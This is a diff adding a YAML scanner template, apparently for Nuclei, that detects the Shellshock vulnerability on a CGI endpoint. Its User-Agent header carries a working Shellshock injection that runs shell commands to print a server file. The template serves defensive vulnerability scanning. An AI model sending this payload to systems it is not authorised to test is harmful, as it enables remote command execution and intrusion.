@@ -1,0 +1,23 @@
+id: shellshock-detection
+
+info:
+  name: Shellshock Vulnerability Detection
+  author: VladGud
+  severity: critical
+  description: Detects Shellshock vulnerability on the target host.
+  tags: shellshock
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/shockme.cgi"
+    headers:
+      User-Agent: "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /usr/lib/cgi-bin/shockme.cgi"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "#!/usr/local/bin/bash"
+      - type: status
+        status:
+          - 200
